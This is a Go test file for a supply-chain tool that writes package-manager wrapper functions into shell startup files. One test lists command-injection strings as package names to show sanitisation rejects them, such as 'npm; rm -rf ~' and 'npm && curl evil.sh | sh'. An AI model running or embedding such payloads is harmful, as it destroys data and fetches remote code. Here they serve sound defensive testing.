package supplychain

import (
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
)

// pipExe is the bare pip executable name, used throughout the pip-variant
// detection tests. It is the command/binary name (distinct from the
// EcosystemPip ecosystem identifier), so it gets its own test constant.
const pipExe = "pip"

func TestGenerateWrapper_Posix(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"npm"})

	if !strings.Contains(wrapper, markerStart) {
		t.Error("missing start marker")
	}
	if !strings.Contains(wrapper, markerEnd) {
		t.Error("missing end marker")
	}
	if !strings.Contains(wrapper, `supply-chain wrap npm "$@"`) {
		t.Errorf("unexpected wrapper content: %s", wrapper)
	}
}

func TestGenerateWrapper_Fish(t *testing.T) {
	wrapper := GenerateWrapper("fish", []string{"npm"})

	if !strings.Contains(wrapper, "function npm") {
		t.Error("missing fish function declaration")
	}
	if !strings.Contains(wrapper, "supply-chain wrap npm $argv") {
		t.Errorf("unexpected fish wrapper: %s", wrapper)
	}
}

func TestGenerateWrapper_MultiplePMs(t *testing.T) {
	wrapper := GenerateWrapper("zsh", []string{"npm", "npx"})

	if !strings.Contains(wrapper, "npm()") {
		t.Error("missing npm function")
	}
	if !strings.Contains(wrapper, "npx()") {
		t.Error("missing npx function")
	}
}

// TestGenerateWrapper_RejectsUnsafeNames verifies that package-manager names
// containing shell metacharacters are dropped before being interpolated into
// the generated RC script, so a malformed or attacker-influenced name can never
// inject commands into a sourced shell startup file (CWE-78).
func TestGenerateWrapper_RejectsUnsafeNames(t *testing.T) {
	malicious := []string{
		"npm; rm -rf ~",
		"npm`id`",
		"npm$(whoami)",
		"npm && curl evil.sh | sh",
		"npm\nrm -rf /",
		"NPM",       // uppercase not allowed by the identifier rule
		"-npm",      // must start with a letter
		"np m",      // whitespace
		"npm'quote", // embedded quote
	}

	for _, shell := range []string{"bash", "zsh", "fish"} {
		for _, name := range malicious {
			wrapper := GenerateWrapper(shell, []string{name})
			// The only content should be the marker block; the unsafe name must
			// not appear anywhere in the generated script.
			if strings.Contains(wrapper, name) {
				t.Errorf("%s wrapper leaked unsafe PM name %q:\n%s", shell, name, wrapper)
			}
		}
	}
}

// TestGenerateWrapper_KeepsValidAlongsideInvalid ensures sanitization is
// per-entry: a valid PM name is still wrapped even when an unsafe one is present
// in the same list.
func TestGenerateWrapper_KeepsValidAlongsideInvalid(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"npm", "evil; rm -rf ~", "pnpm"})

	if !strings.Contains(wrapper, "npm()") {
		t.Error("valid npm wrapper should be present")
	}
	if !strings.Contains(wrapper, "pnpm()") {
		t.Error("valid pnpm wrapper should be present")
	}
	if strings.Contains(wrapper, "rm -rf") {
		t.Errorf("unsafe entry leaked into wrapper:\n%s", wrapper)
	}
}

// TestGenerateWrapper_CapsNameCount verifies that an oversized PM list is
// bounded at maxPMNames so the generated script (and the builder allocating it)
// cannot grow without limit, even via the exported GenerateWrapper entry point.
func TestGenerateWrapper_CapsNameCount(t *testing.T) {
	many := make([]string, maxPMNames+50)
	for i := range many {
		many[i] = "npm"
	}

	got := sanitizePMNames(many)
	if len(got) != maxPMNames {
		t.Errorf("expected sanitizePMNames to cap at %d, got %d", maxPMNames, len(got))
	}

	// The cap must hold through the public wrapper generator too: count the
	// emitted function definitions rather than trusting the helper alone.
	wrapper := GenerateWrapper("bash", many)
	if n := strings.Count(wrapper, "npm()"); n != maxPMNames {
		t.Errorf("expected %d wrapped functions, got %d", maxPMNames, n)
	}
}

func TestInjectAndRemoveFunctions(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	existing := "# existing config\nexport PATH=$PATH:/usr/local/bin\n"
	os.WriteFile(rcFile, []byte(existing), 0o644) //nolint:errcheck,gosec

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	pms := []string{"npm"}

	modified, err := InjectFunctions(shells, pms)
	if err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if len(modified) != 1 {
		t.Fatalf("expected 1 modified, got %d", len(modified))
	}

	content, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	text := string(content)

	if !strings.Contains(text, existing) {
		t.Error("existing content should be preserved")
	}
	if !strings.Contains(text, markerStart) {
		t.Error("marker should be injected")
	}
	if !strings.Contains(text, `supply-chain wrap npm "$@"`) {
		t.Error("wrapper function should be injected")
	}

	// Verify idempotent
	modified2, err := InjectFunctions(shells, pms)
	if err != nil {
		t.Fatalf("second InjectFunctions: %v", err)
	}
	if len(modified2) != 1 {
		t.Fatalf("expected 1 modified on re-inject, got %d", len(modified2))
	}

	content2, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	count := strings.Count(string(content2), markerStart)
	if count != 1 {
		t.Errorf("expected exactly 1 marker block after re-inject, got %d", count)
	}

	// Remove
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}
	if len(removed) != 1 {
		t.Fatalf("expected 1 removed, got %d", len(removed))
	}

	content3, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	text3 := string(content3)
	if strings.Contains(text3, markerStart) {
		t.Error("marker should be removed")
	}
	if !strings.Contains(text3, "export PATH") {
		t.Error("existing content should be preserved after removal")
	}
}

func TestRemoveFunctions_PreservesPermissions(t *testing.T) {
	if runtime.GOOS == goosWindows {
		t.Skip("Unix file permissions not supported on Windows")
	}

	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	// Create an RC file with restrictive 0600 permissions, then inject + remove.
	if err := os.WriteFile(rcFile, []byte("# private config\n"), 0o600); err != nil {
		t.Fatalf("write rc: %v", err)
	}

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	if _, err := InjectFunctions(shells, []string{"npm"}); err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if _, err := RemoveFunctions(shells); err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}

	info, err := os.Stat(rcFile)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("expected RC file mode 0600 to be preserved after removal, got %o", perm)
	}
}

func TestRemoveFunctions_NoBlock(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".zshrc")
	os.WriteFile(rcFile, []byte("# clean file\n"), 0o644) //nolint:errcheck,gosec

	shells := []Shell{{Name: "zsh", RCFile: rcFile}}
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}
	if len(removed) != 0 {
		t.Error("should not modify file without marker")
	}
}

func TestRemoveFunctions_MissingFile(t *testing.T) {
	shells := []Shell{{Name: "bash", RCFile: "/tmp/nonexistent-rc-file-test"}}
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(removed) != 0 {
		t.Error("missing file should not be reported as modified")
	}
}

func TestInjectFunctions_CreatesFile(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, "subdir", ".bashrc")

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	modified, err := InjectFunctions(shells, []string{"npm"})
	if err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if len(modified) != 1 {
		t.Error("should create and modify new file")
	}

	content, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	if !strings.Contains(string(content), markerStart) {
		t.Error("new file should contain marker")
	}
}

func TestHasInjection(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	os.WriteFile(rcFile, []byte("# empty\n"), 0o644) //nolint:errcheck,gosec
	if HasInjection(rcFile) {
		t.Error("should return false for clean file")
	}

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	InjectFunctions(shells, []string{"npm"}) //nolint:errcheck,gosec

	if !HasInjection(rcFile) {
		t.Error("should return true after injection")
	}
}

func TestHasCurrentInjection(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	os.WriteFile(rcFile, []byte("# empty\n"), 0o644) //nolint:errcheck,gosec

	// Before injection, neither HasInjection nor HasCurrentInjection match.
	if HasCurrentInjection(rcFile, "bash", []string{"npm"}) {
		t.Error("should return false for clean file")
	}

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	InjectFunctions(shells, []string{"npm"}) //nolint:errcheck,gosec

	// After injection the exact wrapper is present.
	if !HasCurrentInjection(rcFile, "bash", []string{"npm"}) {
		t.Error("should return true after injecting npm wrapper for bash")
	}

	// A different PM set does not match the already-injected block.
	if HasCurrentInjection(rcFile, "bash", []string{"npm", "pnpm"}) {
		t.Error("should return false when PM set differs from what was injected")
	}
}

func TestEvalCommand(t *testing.T) {
	cmd := EvalCommand([]string{"npm"})
	if !strings.Contains(cmd, markerStart) {
		t.Error("eval command should contain markers")
	}
	if !strings.Contains(cmd, "npm()") {
		t.Error("eval command should contain npm function")
	}
}

func TestIsPipVariant(t *testing.T) {
	tests := []struct {
		name string
		want bool
	}{
		{pipExe, true},
		{"pip3", true},
		{"pip3.11", true},
		{"pip3.12", true},
		// Distinct tools that merely share the "pip" prefix must not match.
		{"pipx", false},
		{"pipenv", false},
		{"pip-compile", false},
		{"npm", false},
		{"", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsPipVariant(tt.name); got != tt.want {
				t.Errorf("IsPipVariant(%q) = %v, want %v", tt.name, got, tt.want)
			}
		})
	}
}

// TestGenerateWrapper_WrapsVersionedPip verifies that a versioned pip variant
// survives sanitization and is emitted as a wrapper function. Before the
// validPMName fix, the dot in "pip3.12" caused sanitizePMNames to drop it, so
// `pip3.12 install` silently bypassed enforcement.
func TestGenerateWrapper_WrapsVersionedPip(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"pip3.12"})
	if !strings.Contains(wrapper, "pip3.12()") {
		t.Errorf("versioned pip variant should be wrapped, got:\n%s", wrapper)
	}
	if !strings.Contains(wrapper, "supply-chain wrap pip3.12") {
		t.Errorf("wrapper should forward the exact variant name, got:\n%s", wrapper)
	}
}

func TestDetectPipVariants(t *testing.T) {
	t.Run("finds and sorts variants on PATH", func(t *testing.T) {
		dir := t.TempDir()
		for _, name := range []string{pipExe, "pip3", "pip3.12"} {
			fname := name
			if runtime.GOOS == goosWindows {
				fname = name + ".exe"
			}
			if err := os.WriteFile(filepath.Join(dir, fname), []byte{}, 0o755); err != nil { //nolint:gosec
				t.Fatalf("seed %s: %v", fname, err)
			}
		}
		t.Setenv("PATH", dir)

		got := DetectPipVariants()
		want := []string{pipExe, "pip3", "pip3.12"}
		if !slices.Equal(got, want) {
			t.Errorf("DetectPipVariants() = %v, want %v", got, want)
		}
	})

	t.Run("ignores lookalike commands", func(t *testing.T) {
		dir := t.TempDir()
		for _, name := range []string{pipExe, "pipx", "pipenv", "pip-compile"} {
			fname := name
			if runtime.GOOS == goosWindows {
				fname = name + ".exe"
			}
			if err := os.WriteFile(filepath.Join(dir, fname), []byte{}, 0o755); err != nil { //nolint:gosec
				t.Fatalf("seed %s: %v", fname, err)
			}
		}
		t.Setenv("PATH", dir)

		for _, v := range DetectPipVariants() {
			if v == "pipx" || v == "pipenv" || v == "pip-compile" {
				t.Errorf("DetectPipVariants returned non-pip executable %q", v)
			}
		}
	})

	t.Run("deduplicates across PATH dirs", func(t *testing.T) {
		dir1, dir2 := t.TempDir(), t.TempDir()
		fname := pipExe
		if runtime.GOOS == goosWindows {
			fname = pipExe + ".exe"
		}
		os.WriteFile(filepath.Join(dir1, fname), []byte{}, 0o755) //nolint:errcheck,gosec
		os.WriteFile(filepath.Join(dir2, fname), []byte{}, 0o755) //nolint:errcheck,gosec
		t.Setenv("PATH", dir1+string(os.PathListSeparator)+dir2)

		got := DetectPipVariants()
		if len(got) != 1 || got[0] != pipExe {
			t.Errorf("expected exactly one 'pip' after dedup, got %v", got)
		}
	})

	t.Run("ignores non-executable pip-named files", func(t *testing.T) {
		if runtime.GOOS == goosWindows {
			// Windows has no execute-bit concept (executability is governed by
			// file extension), so DetectPipVariants does not filter on mode there
			// and this Unix-only behavior cannot be exercised.
			t.Skip("execute-bit filtering is Unix-only")
		}

		dir := t.TempDir()
		// An executable pip alongside a pip3 that lacks any execute bit (a stray
		// data file). Only the runnable one should be wrapped — a wrapper for the
		// non-exec file would later fail at exec.LookPath.
		if err := os.WriteFile(filepath.Join(dir, pipExe), []byte{}, 0o755); err != nil { //nolint:gosec
			t.Fatalf("seed %s: %v", pipExe, err)
		}
		if err := os.WriteFile(filepath.Join(dir, "pip3"), []byte{}, 0o600); err != nil {
			t.Fatalf("seed pip3: %v", err)
		}
		t.Setenv("PATH", dir)

		got := DetectPipVariants()
		if !slices.Equal(got, []string{pipExe}) {
			t.Errorf("expected only the executable [pip], got %v", got)
		}
	})

	t.Run("falls back to pip when none found", func(t *testing.T) {
		t.Setenv("PATH", t.TempDir())
		got := DetectPipVariants()
		if len(got) != 1 || got[0] != pipExe {
			t.Errorf("expected [pip] fallback, got %v", got)
		}
	})

	t.Run("falls back to pip when PATH is unset", func(t *testing.T) {
		t.Setenv("PATH", "")
		got := DetectPipVariants()
		if len(got) != 1 || got[0] != pipExe {
			t.Errorf("expected [pip] fallback, got %v", got)
		}
	})
}

func TestDetectShells(t *testing.T) {
	// DetectShells resolves RC paths from os.UserHomeDir(), which honors $HOME on
	// Unix but reads %USERPROFILE% on Windows — so these $HOME-driven cases are
	// Unix-only.
	if runtime.GOOS == goosWindows {
		t.Skip("DetectShells home-dir resolution is exercised via $HOME, which is Unix-only")
	}

	t.Run("current shell is ordered first", func(t *testing.T) {
		home := t.TempDir()
		t.Setenv("HOME", home)
		t.Setenv("SHELL", "/bin/zsh")
		// Both RC files exist: bash qualifies via fileExists, zsh via the
		// current-shell match. The current shell must be prepended.
		for _, f := range []string{".bashrc", ".zshrc"} {
			if err := os.WriteFile(filepath.Join(home, f), []byte("# rc\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		}

		shells := DetectShells()
		if len(shells) == 0 {
			t.Fatal("expected at least one detected shell")
		}
		if shells[0].Name != "zsh" {
			t.Errorf("first shell = %q, want zsh (the current $SHELL)", shells[0].Name)
		}
		names := make([]string, len(shells))
		for i, s := range shells {
			names[i] = s.Name
		}
		if !slices.Contains(names, "bash") {
			t.Errorf("expected bash among detected shells (its .bashrc exists), got %v", names)
		}
	})

	t.Run("no RC files and no SHELL yields nothing", func(t *testing.T) {
		t.Setenv("HOME", t.TempDir())
		t.Setenv("SHELL", "")
		if shells := DetectShells(); len(shells) != 0 {
			t.Errorf("expected no shells for an empty home with no $SHELL, got %v", shells)
		}
	})
}

// TestGenerateWrapper_PosixContainsGuard verifies the bash/zsh wrapper is
// fail-closed: it guards the armis-cli invocation with `command -v`, warns on
// stderr when the binary is missing, and falls back to running the real package
// manager so an install never silently breaks after an armis-cli upgrade.
func TestGenerateWrapper_PosixContainsGuard(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"npm"})

	if !strings.Contains(wrapper, "if command -v") {
		t.Errorf("posix wrapper missing `command -v` guard:\n%s", wrapper)
	}
	if !strings.Contains(wrapper, "armis-cli not found") {
		t.Errorf("posix wrapper missing the missing-binary warning:\n%s", wrapper)
	}
	if !strings.Contains(wrapper, `command npm "$@"`) {
		t.Errorf("posix wrapper missing the un-wrapped fallback `command npm \"$@\"`:\n%s", wrapper)
	}
}

// TestGenerateWrapper_FishContainsGuard is the fish-syntax counterpart to
// TestGenerateWrapper_PosixContainsGuard. The guard uses fish-native `command -q`
// (not POSIX `command -v`, which fish's `command` builtin does not accept — using
// it would make the guard always fail and silently disable enforcement for fish).
func TestGenerateWrapper_FishContainsGuard(t *testing.T) {
	wrapper := GenerateWrapper("fish", []string{"npm"})

	if !strings.Contains(wrapper, "if command -q") {
		t.Errorf("fish wrapper missing `command -q` guard:\n%s", wrapper)
	}
	if !strings.Contains(wrapper, "armis-cli not found") {
		t.Errorf("fish wrapper missing the missing-binary warning:\n%s", wrapper)
	}
	if !strings.Contains(wrapper, "command npm $argv") {
		t.Errorf("fish wrapper missing the un-wrapped fallback `command npm $argv`:\n%s", wrapper)
	}
}

// TestGenerateWrapper_WarningReferencesPMName verifies the fallback warning names
// the package manager the user actually invoked (not a hard-coded "npm"), for
// every shell and including versioned pip variants.
func TestGenerateWrapper_WarningReferencesPMName(t *testing.T) {
	for _, shell := range []string{"bash", "zsh", "fish"} {
		for _, pm := range []string{"npm", "pip3.12", "poetry"} {
			wrapper := GenerateWrapper(shell, []string{pm})
			want := "running " + pm + " WITHOUT supply-chain enforcement"
			if !strings.Contains(wrapper, want) {
				t.Errorf("%s wrapper for %q missing PM name in warning %q:\n%s", shell, pm, want, wrapper)
			}
		}
	}
}

// TestResolveCliPath_PrefersBareNameWhenOnPath verifies that when armis-cli is
// resolvable on $PATH, the wrapper embeds the bare name so the shell re-resolves
// it on every call — surviving package-manager upgrades that move the binary.
func TestResolveCliPath_PrefersBareNameWhenOnPath(t *testing.T) {
	dir := t.TempDir()
	fname := cliBinaryName
	if runtime.GOOS == goosWindows {
		fname = cliBinaryName + ".exe"
	}
	if err := os.WriteFile(filepath.Join(dir, fname), []byte{}, 0o755); err != nil { //nolint:gosec
		t.Fatalf("seed %s: %v", cliBinaryName, err)
	}
	t.Setenv("PATH", dir)

	if got := resolveCliPath(); got != cliBinaryName {
		t.Errorf("resolveCliPath() = %q, want %q (bare name when on PATH)", got, cliBinaryName)
	}
}

// TestResolveCliPath_FallsBackToAbsWhenNotOnPath verifies that when armis-cli is
// not on $PATH, resolveCliPath returns an absolute path (or the bare-name
// fallback) — but never resolves symlinks, so it cannot return a version-pinned
// Cellar-style path that an upgrade would delete.
func TestResolveCliPath_FallsBackToAbsWhenNotOnPath(t *testing.T) {
	// Non-empty but empty dir: armis-cli is not resolvable on PATH.
	t.Setenv("PATH", t.TempDir())

	got := resolveCliPath()
	if got != cliBinaryName && !filepath.IsAbs(got) {
		t.Errorf("resolveCliPath() = %q, want an absolute path or the %q fallback", got, cliBinaryName)
	}
}
